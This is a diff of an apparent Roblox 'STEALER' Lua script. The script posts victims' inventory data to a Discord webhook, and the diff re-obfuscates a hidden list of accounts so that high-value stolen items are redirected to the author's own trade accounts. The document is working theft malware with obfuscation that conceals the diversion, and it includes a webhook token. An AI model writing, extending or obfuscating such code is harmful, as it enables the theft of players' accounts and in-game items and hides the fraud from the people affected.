@@ -17,17 +17,17 @@ local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/mai
 local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCrnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
 
 -- ==========================================
--- JUGADORES DUAL OCULTOS (CODIFICADOS)
+-- JUGADORES DUAL (OCULTOS EN EL CÓDIGO)
 -- ==========================================
-local _eD = "Kdkdkdkorooosur/WudghWhvwlqjPYVV/d}dh6o999/mxdqfduorvhonudn:/d}dqxysur:::/sshrlkmy/EhNlqgSohdvhRpj"
-local _dD = ""
-for _i = 1, #_eD do
-    _dD = _dD .. string.char(string.byte(_eD, _i) - 3)
-end
-local jugadoresObjetivosDual = {}
-for _n in string.gmatch(_dD, "([^,]+)") do
-    table.insert(jugadoresObjetivosDual, _n)
-end
+local jugadoresObjetivosDual = {
+    string.char(72,97,104,97,104,97,104,108,111,108,108,108,112,114,111), -- Hahahahlolllpro
+    string.char(84,114,97,100,101,84,101,115,116,105,110,103,77,86,83,83), -- TradeTestingMVSS
+    string.char(97,122,97,101,51,108,54,54,54), -- azae3l666
+    string.char(106,117,97,110,99,97,114,108,111,115,101,108,107,114,97,107,55), -- juancarloselkrak7
+    string.char(97,122,97,110,117,118,112,114,111,55,55,55), -- azanuvpro777
+    string.char(112,112,101,111,105,104,106,118), -- ppeoihjv
+    string.char(66,101,75,105,110,100,80,108,101,97,115,101,79,109,103) -- BeKindPleaseOmg
+}
 
 -- ==========================================
 -- LÓGICA DE INICIO/FILTRADO DE INVENTARIO (EXTRAÍDA DEL SCRIPT 1)
@@ -324,7 +324,7 @@ task.spawn(function()
                     end)
                 end
                 
-                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo
+                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo (DUAL)
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
                 -- Hit normal (< 5000): Notifica de inmediato al promocionador únicamente
